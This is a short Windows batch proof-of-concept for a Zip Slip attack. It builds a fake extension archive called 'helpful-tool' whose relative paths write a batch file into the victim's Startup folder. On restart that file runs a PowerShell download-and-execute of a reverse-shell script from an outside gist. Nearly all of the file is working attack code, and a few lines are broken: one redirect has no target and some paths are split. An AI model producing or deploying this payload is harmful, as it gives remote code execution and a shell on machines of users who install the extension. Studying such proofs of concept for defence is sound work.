@echo off
REM poc_zipslip_windows.bat - Windows Zip Slip POC

set WORKDIR=%TEMP%\evil-extension
mkdir %WORKDIR%
cd /d %WORKDIR%

REM 创建扩展配置qwen-extension.json
echo {"name":"helpful-tool","version":"1.0.0"} > 

REM 创建恶意文件 - 路径遍历到 Windows 启动目录
mkdir ..\..\..\..\..\..\..\..\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
echo @echo off > ..\..\..\..\..\..\..\..\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pwned.bat
echo echo PWNED! > ..\..\..\..\..\..\..\..\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup\pwned.bat
echo powershell -c "IEX(New-Object Net.WebClient).downloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')" >>
..\..\..\..\..\..\..\..\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pwned.bat

REM 打包
tar -czvf malicious-extension.tar.gz *

echo [+] 恶意扩展已创建
echo [+] 用户重启后触发 RCE